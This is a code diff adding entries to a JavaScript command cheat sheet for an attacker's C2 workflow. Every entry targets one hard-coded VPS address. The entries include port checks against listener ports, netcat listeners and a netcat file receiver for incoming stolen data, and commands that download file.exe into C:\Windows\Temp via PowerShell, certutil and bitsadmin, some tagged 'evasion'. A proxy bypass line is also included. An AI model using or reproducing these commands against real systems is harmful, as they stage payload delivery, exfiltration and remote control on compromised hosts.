@@ -2222,6 +2222,144 @@ const COMMANDS = [
     tags: ["ps", "cloud", "postexploit"],
     accent: "#03a9f4"
   },
+  {
+    title: "Test VPS Connection",
+    code: "Test-NetConnection 168.144.166.97 -Port 4444",
+    tags: ["ps", "recon", "c2"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Test Multiple Ports",
+    code: "@(4444,8080,8081,8083,9999) | % { Test-NetConnection 168.144.166.97 -Port $_ | Select RemotePort, TcpTestSucceeded }",
+    tags: ["ps", "recon", "c2"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Quick Port Check (Faster)",
+    code: "$t = New-Object Net.Sockets.TcpClient; try { $t.Connect('168.144.166.97', 4444); 'OPEN' } catch { 'CLOSED' }; $t.Close()",
+    tags: ["ps", "recon", "c2"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Ping VPS",
+    code: "ping 168.144.166.97 -n 4",
+    tags: ["cmd", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Traceroute to VPS",
+    code: "tracert 168.144.166.97",
+    tags: ["cmd", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Check HTTP Server",
+    code: "Invoke-WebRequest -Uri 'http://168.144.166.97:8080' -UseBasicParsing -TimeoutSec 5 | Select StatusCode",
+    tags: ["ps", "recon", "c2"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Curl Test (Alt)",
+    code: "curl.exe -s -o /dev/null -w '%{http_code}' http://168.144.166.97:8080",
+    tags: ["cmd", "recon", "c2"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "DNS Lookup",
+    code: "nslookup 168.144.166.97",
+    tags: ["cmd", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Check Own IP",
+    code: "(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content",
+    tags: ["ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Check Outbound Ports",
+    code: "@(80,443,4444,8080) | % { $r = Test-NetConnection -ComputerName 168.144.166.97 -Port $_; \"$($_): $($r.TcpTestSucceeded)\" }",
+    tags: ["ps", "recon", "firewall"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "VPS - Check Listening Ports",
+    code: "ss -tlnp",
+    tags: ["linux", "vps", "recon"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS - Check UFW Status",
+    code: "ufw status numbered",
+    tags: ["linux", "vps", "firewall"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS - Allow Port",
+    code: "ufw allow 9999",
+    tags: ["linux", "vps", "firewall"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS - HTTP Server (any port)",
+    code: "python3 -m http.server 9999",
+    tags: ["linux", "vps", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS - Kill Process on Port",
+    code: "fuser -k 8080/tcp",
+    tags: ["linux", "vps"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS - What's on Port",
+    code: "lsof -i :8080",
+    tags: ["linux", "vps", "recon"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS - NC Listener",
+    code: "nc -lvnp 4444",
+    tags: ["linux", "vps", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS - NC File Receiver",
+    code: "nc -lvnp 9999 > received_file.txt",
+    tags: ["linux", "vps", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "Download from VPS",
+    code: "IWR -Uri 'http://168.144.166.97:8080/file.exe' -OutFile C:\\Windows\\Temp\\file.exe -UseBasicParsing",
+    tags: ["ps", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Download via Certutil",
+    code: "certutil -urlcache -split -f http://168.144.166.97:8080/file.exe C:\\Windows\\Temp\\file.exe",
+    tags: ["cmd", "c2", "evasion"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Download via Bitsadmin",
+    code: "bitsadmin /transfer job /download /priority high http://168.144.166.97:8080/file.exe C:\\Windows\\Temp\\file.exe",
+    tags: ["cmd", "c2", "evasion"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Check Proxy Settings",
+    code: "netsh winhttp show proxy",
+    tags: ["cmd", "recon", "firewall"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Bypass Proxy (Direct)",
+    code: "[System.Net.WebRequest]::DefaultWebProxy = $null",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
 ];
 
 const list = document.getElementById('cmdList');
